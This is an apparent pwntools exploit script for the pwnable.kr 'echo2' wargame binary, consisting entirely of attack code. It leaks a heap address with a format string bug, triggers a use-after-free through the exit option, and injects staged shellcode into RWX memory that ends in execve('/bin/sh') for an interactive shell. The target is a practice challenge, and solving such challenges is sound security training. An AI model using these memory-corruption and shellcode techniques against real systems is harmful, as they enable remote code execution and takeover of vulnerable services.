# much easier knowing that bss and heap are RWX ;)
from pwn import *

p = process('./echo2')
# p = remote('pwnable.kr', 9011)

e = ELF('./echo2')
context.binary = e

p.recvuntil(b" : ")
p.sendline(b"a")

# get heap pointer location with FSB
p.recvuntil(b"> ")
p.sendline(b"2")
p.sendline(b"%4$p")
p.recvuntil(b"hello a\n")
heap_loc = p.recvline().strip()
print("Got heap location:", heap_loc)

# Freeing object with exit
p.recvuntil(b"> ")
p.sendline(b"4")
p.sendline(b"n")

# payload is first stage shellcode + function pointer to shellcode
# shellcode is exactly 0x18 bytes, reads from stdin to 0x6020b0, and then executes it
p.recvuntil(b"> ")
p.sendline(b"3")
sc = asm("nop\nmov r8,0x6020b0\n" + shellcraft.read(0, 'r8', 0x80) + "\npush r8\nret")
p.sendline(sc + p64(int(heap_loc,16)-7))
p.recvuntil(b"> ")

# send second stage shellcode + get shell
p.sendline(asm(shellcraft.execve("/bin/sh")))
p.interactive()